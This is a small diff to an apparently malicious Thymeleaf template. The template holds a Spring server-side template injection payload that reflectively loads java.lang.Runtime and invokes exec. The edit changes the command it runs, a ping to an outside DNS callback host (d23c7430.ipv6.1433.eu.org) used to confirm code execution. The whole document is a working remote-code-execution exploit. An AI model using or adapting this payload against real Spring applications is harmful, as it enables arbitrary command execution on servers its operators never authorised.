@@ -16,7 +16,7 @@
                     th:with="exeMethod=${T(org.springframework.util.ReflectionUtils).findMethod(T(org.springframework.util.ClassUtils).forName('java.lang.Runtime',T(org.springframework.util.ClassUtils).getDefaultClassLoader()), 'exec', ''.getClass() )}"
             >
                 <a
-                        th:with="param2=${T(org.springframework.util.ReflectionUtils).invokeMethod(exeMethod, runtimeObj, 'ping -nc 1 d23c7430.ipv6.1433.eu.org' )
+                        th:with="param2=${T(org.springframework.util.ReflectionUtils).invokeMethod(exeMethod, runtimeObj, 'ping d23c7430.ipv6.1433.eu.org' )
                 }"
                         th:href="${param2}"
                 ></a>
